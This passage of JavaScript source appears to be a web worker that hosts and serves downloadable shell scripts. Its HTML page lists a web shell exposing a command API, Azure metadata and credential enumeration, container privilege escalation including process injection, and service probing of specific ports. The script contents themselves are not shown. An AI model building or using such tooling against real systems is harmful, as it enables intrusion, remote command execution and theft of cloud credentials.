            border-left: 3px solid #6c5ce7;
            transition: all 0.2s ease;
        }
        .file-item:hover {
            background: #f1f2f6;
            transform: translateX(5px);
        }
        .file-link {
            text-decoration: none;
            font-weight: bold;
            color: #2d3436;
            font-size: 16px;
            display: block;
            margin-bottom: 4px;
        }
        .file-link:hover {
            color: #6c5ce7;
        }
        .file-desc {
            color: #636e72;
            font-size: 13px;
            line-height: 1.4;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📁 Shell Scripts Repository</h1>
        <p class="subtitle">Download security testing and system analysis scripts</p>

        <div class="files-section">
            <h3>📁 Available Shell Scripts</h3>
            <p>Click any script below to download it directly:</p>
            <ul class="files-list">
                <li class="file-item">
                    <a href="/files/basic-info" class="file-link">📋 basic-info.sh</a>
                    <div class="file-desc">Basic system information gathering - user context, network interfaces, running processes</div>
                </li>
                <li class="file-item">
                    <a href="/files/advanced-info" class="file-link" style="color: #e74c3c; font-weight: bold;">🔍 advanced-info.sh</a>
                    <div class="file-desc">Comprehensive system enumeration - detailed OS info, environment variables, virtualization detection, security configuration</div>
                </li>
                <li class="file-item">
                    <a href="/files/network-test" class="file-link" style="color: #f39c12; font-weight: bold;">🌐 network-test.sh</a>
                    <div class="file-desc">Network connectivity testing template - configure target IP and test various connection methods (for authorized testing)</div>
                </li>
                <li class="file-item">
                    <a href="/files/service-probe" class="file-link" style="color: #e74c3c; font-weight: bold;">🔍 service-probe.sh</a>
                    <div class="file-desc">Service analysis script - probes exposed ports (873, 8888, 9000, 1384) and identifies running services</div>
                </li>
                <li class="file-item">
                    <a href="/files/web-shell" class="file-link" style="color: #9c27b0; font-weight: bold;">🐍 web-shell.py</a>
                    <div class="file-desc">Simple command API server - GET /api/command?cmd=YOUR_COMMAND for instant results</div>
                </li>
                <li class="file-item">
                    <a href="/files/azure-enum" class="file-link" style="color: #0078d4; font-weight: bold;">☁️ azure-enum.sh</a>
                    <div class="file-desc">Azure Container IAM and Metadata Enumeration - IMDS queries, managed identity checks, Azure CLI enumeration, credential discovery</div>
                </li>
                <li class="file-item">
                    <a href="/files/privesc" class="file-link" style="color: #dc3545; font-weight: bold;">🔓 privesc.sh</a>
                    <div class="file-desc">Container Privilege Escalation Testing - supervisor control, init script manipulation, rsync traversal, Jupyter exploitation, process injection</div>
                </li>
            </ul>
        </div>
    </div>
</body>
</html>`;
}



export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type, Authorization',
        },
      });
    }

    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    };

    if (url.pathname === '/') {
      const htmlContent = await getHTMLContent();
      return new Response(htmlContent, {
        headers: {
          'Content-Type': 'text/html',
          ...corsHeaders,
        },
      });
    }



    // Handle file downloads
    if (url.pathname.startsWith('/files/')) {
      const filename = url.pathname.substring(7); // Remove '/files/'
      const fileContent = STATIC_FILES[filename];
      
      if (fileContent) {
        let downloadFilename = filename;
        if (filename === 'web-shell') {
          downloadFilename = 'web-shell';
        } else if (!filename.includes('.')) {
          downloadFilename = filename;
        }
        
        return new Response(fileContent, {
          headers: {
            'Content-Type': 'application/octet-stream',
            'Content-Disposition': `attachment; filename="${downloadFilename}"`,
            ...corsHeaders,
          },
        });
      }
      
      return new Response('File not found', { 
        status: 404,
        headers: corsHeaders,
      });
    }

    // API endpoints for logging (kept for compatibility)
    if (url.pathname === '/api/log') {
      if (request.method === 'POST') {
        try {
          const logData = await request.json();
          console.log('Log entry:', logData);
          return new Response(JSON.stringify({ status: 'logged' }), {
            headers: {
              'Content-Type': 'application/json',
              ...corsHeaders,
            },
          });
        } catch (error) {
          return new Response('Invalid JSON', { 
            status: 400,
            headers: corsHeaders,
          });
        }
      }
    }

    return new Response('Not found', { 
      status: 404,
      headers: corsHeaders,
    });
  },
};